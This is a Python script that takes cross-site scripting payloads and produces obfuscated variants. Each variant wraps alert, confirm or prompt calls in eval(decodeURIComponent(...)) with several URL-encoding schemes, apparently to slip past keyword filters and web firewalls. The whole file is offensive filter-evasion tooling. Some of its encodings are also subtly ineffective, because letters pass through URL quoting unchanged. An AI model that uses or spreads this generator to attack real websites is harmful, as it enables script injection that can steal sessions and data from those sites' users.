import sys
import re
from urllib.parse import quote, quote_plus

def url_encode(payload):
    keywords = ['confirm', 'alert', 'prompt']
    for keyword in keywords:
        pattern = re.compile(keyword, re.IGNORECASE)
        match = pattern.search(payload)
        if match:
            start = match.start()
            encoded_payloads = []
            
            # URL encode the entire function call
            url_encoded = quote(payload[start:])
            encoded_payloads.append(f"eval(decodeURIComponent('{url_encoded}'))")
            
            # URL encode just the keyword
            url_keyword = quote(keyword)
            rest = payload[start + len(keyword):]
            encoded_payloads.append(f"eval(decodeURIComponent('{url_keyword}')+'{rest}')")
            
            # URL encode with plus encoding
            url_encoded_plus = quote_plus(payload[start:])
            encoded_payloads.append(f"eval(decodeURIComponent('{url_encoded_plus}'))")
            
            # Partial encoding - encode each character individually
            partial_encoded = ''.join(quote(c) for c in keyword)
            encoded_payloads.append(f"eval(decodeURIComponent('{partial_encoded}')+'{rest}')")
            
            # Encode special characters only
            special_chars = {'(': '%28', ')': '%29', '1': '%31'}
            encoded_special = ''.join(special_chars.get(c, c) for c in payload[start:])
            encoded_payloads.append(f"eval(decodeURIComponent('{encoded_special}'))")
            
            return encoded_payloads
    return [payload]

if __name__ == "__main__":
    for line in sys.stdin:
        payload = line.strip()
        encoded_payloads = url_encode(payload)
        for ep in encoded_payloads:
            print(ep)

